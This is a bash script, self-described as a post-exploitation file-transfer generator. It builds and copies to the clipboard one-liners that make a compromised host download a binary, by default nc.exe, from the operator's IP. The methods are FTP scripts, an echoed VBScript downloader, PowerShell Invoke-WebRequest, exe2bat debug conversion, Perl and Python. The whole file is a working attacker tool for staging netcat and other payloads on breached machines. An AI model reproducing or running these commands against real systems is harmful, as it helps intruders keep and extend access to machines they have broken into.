#!/bin/bash

function help {
	echo -e "A simple script to quickly generate file-transfers for post-exploitation.\n\nUsage:\n\t-m | --method\t\tThe transfer method to use: ftp|vbs|powershell|debug|perl|python|all\n\t-b | --binary\t\tThe binary to use (use absolute path for debug method)\n\t-l | --localhost\tYour IP address. When not specified it uses the \$ip env variable.\n\t\n";
}

set -o errexit -o pipefail -o noclobber -o nounset

! getopt --test > /dev/null 
if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
    echo '`getopt --test` failed in this environment.'
    exit 1
fi

#Print banner
echo -e "\033[0;32m\033[1m  ____ ____  _______  __\n / ___|  _ \| ____\ \/ /\n| |  _| |_) |  _|  \  / \n| |_| |  __/| |___ /  \ \n \____|_|   |_____/_/\_\\\\\n^^^^^^^^^^^^^^^^^^^^^^^^^^\033[0m\n"

#Set options
OPTIONS=m:l:b:h
LONGOPTS=method:,localhost:,binary:,help

! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
    exit 2
fi
eval set -- "$PARSED"

#Check if ip is set
if [ -z ${ip+x} ]; then
	ip="none";
fi

method=ftp localhost=$ip binary=nc.exe

while true; do
    case "$1" in
        -m|--method)
            method="$2"
            shift 2
            ;;
        -l|--localhost)
            localhost="$2"
            shift 2
            ;;
        -b|--binary)
            binary="$2"
            shift 2
            ;;
	-h|--help)
	    help
	    exit 4;
	    ;;
        --)
            shift
            break
            ;;
        *)
            echo "Script error."
            exit 3
            ;;
    esac
done

#Check if any ip option is specified
if [ $ip == "none" ]; then
        echo -e "Error: \$ip env variable is not set. Set \$ip or specify your localhost with -l|--localhost. Quiting!\n";
	exit 4;
fi;


#Show options;
echo -e "[+] Method: $method"
echo "[+] Localhost: $localhost";
echo -e "[+] Binary: $binary\n\nOutput:\n";

#Check if method is proper:
legit=0;
case $method in
     ftp|all)
	legit=1
	command=$(echo -e "echo open $localhost> ftp.txt && echo bin>>ftp.txt && echo get $binary>>ftp.txt && echo bye>>ftp.txt && ftp -A -s:ftp.txt");
	echo $command | xclip -selection clipboard && echo -e "$command\n"
          ;;&
     vbs|cscript|all)
        legit=1
	command=$(echo -e "echo strUrl = WScript.Arguments.Item(0) > wget.vbs\necho StrFile = WScript.Arguments.Item(1) >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs\necho Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs\necho Err.Clear >> wget.vbs\necho Set http = Nothing >> wget.vbs\necho Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs\necho http.Open \"GET\", strURL, False >> wget.vbs\necho http.Send >> wget.vbs\necho varByteArray = http.ResponseBody >> wget.vbs\necho Set http = Nothing >> wget.vbs\necho Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs\necho Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs\necho strData = \"\" >> wget.vbs\necho strBuffer = \"\" >> wget.vbs\necho For lngCounter = 0 to UBound(varByteArray) >> wget.vbs\necho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs\necho Next >> wget.vbs\necho ts.Close >> wget.vbs\ncscript wget.vbs http://$localhost/$binary $binary");
	echo $command | xclip -selection clipboard && echo -e "$command\n"
	 ;;&
     powershell|all)
	legit=1
	command=$(echo -e "Invoke-WebRequest http://$ip/$binary -OutFile $binary");
        echo $command | xclip -selection clipboard && echo -e "$command\n"
         ;;&
     debug)
        legit=1
	if [ ! -f $binary ]; then
    		echo -e "Error: File not found. Please specify a valid file for the debug method. Quiting\n"
		exit 4;
	fi
	file_name=$(echo "$binary" | sed "s/.*\///") && cp $binary /tmp/ && upx -9 /tmp/$file_name &>/dev/null  && cd /tmp/ && wine /usr/share/windows-binaries/exe2bat.exe $file_name debug.txt; cat /tmp/debug.txt | xclip -selection clipboard;
          ;;&
     perl|all)
	legit=1
	command=$(echo -e "echo '#!/usr/bin/perl' > test.pl && echo 'use File::Fetch;' >> test.pl && echo 'my \$url = \"http://$localhost/$binary\";' >> test.pl && echo 'my \$ff = File::Fetch->new(uri => \$url);' >> test.pl && echo 'my \$file = \$ff->fetch() or die \$ff->error;' >> test.pl && /usr/bin/perl test.pl");
        echo $command | xclip -selection clipboard && echo -e "$command\n"
	;;&
     python|all)
        legit=1
	command=$(echo -e "echo -e '#!/usr/bin/python' > test.py && echo 'import urllib' >> test.py && echo 'urllib.urlretrieve (\"http://$localhost/$binary\", \"$binary\")' >> test.py && /usr/bin/python test.py");
        echo $command | xclip -selection clipboard && echo -e "$command\n"
        ;;
     *)
	if [ $legit -eq 0 ]; then
          echo "Error: No valid transfer method specified. Quiting."
	  exit 4;
	fi;
	;;
esac

if [ $method == "all" ]; then
	echo "Copy a transfer method ouput manually.\n"
else
	echo -e "(Copied to clipboard)\n";
fi;
